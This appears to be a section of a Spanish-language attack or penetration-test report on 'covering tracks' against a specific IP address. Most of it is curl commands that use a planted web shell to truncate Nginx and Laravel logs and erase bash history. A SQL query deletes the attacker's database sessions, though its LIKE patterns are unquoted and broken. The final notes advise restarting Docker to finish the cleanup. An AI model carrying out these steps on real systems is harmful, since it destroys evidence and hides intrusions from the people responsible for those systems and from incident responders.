# Fase 5 - Borrado de Huellas (Covering Tracks)

**Target:** http://37.60.230.11

---

## Logs eliminados

```bash
# Limpiar access log de Nginx
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/access.log"

# Limpiar error log de Nginx
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/error.log"

# Limpiar log de Laravel
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/www/html/storage/logs/laravel.log"

# Limpiar bash_history
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=history%20-c%20%26%26%20truncate%20-s%200%20~/.bash_history"
```

## Registros modificados en BD

```sql
-- Eliminar sesiones del atacante
DELETE FROM sessions WHERE user_id IN (
  SELECT id FROM users WHERE email LIKE attacker% OR email LIKE evi%
);
```

## Notas

- Los logs de Docker (historial del contenedor) pueden persistir incluso despues de truncar los archivos internos.
- Para limpieza total a nivel de contenedor, debe reiniciarse el contenedor o el host Docker.
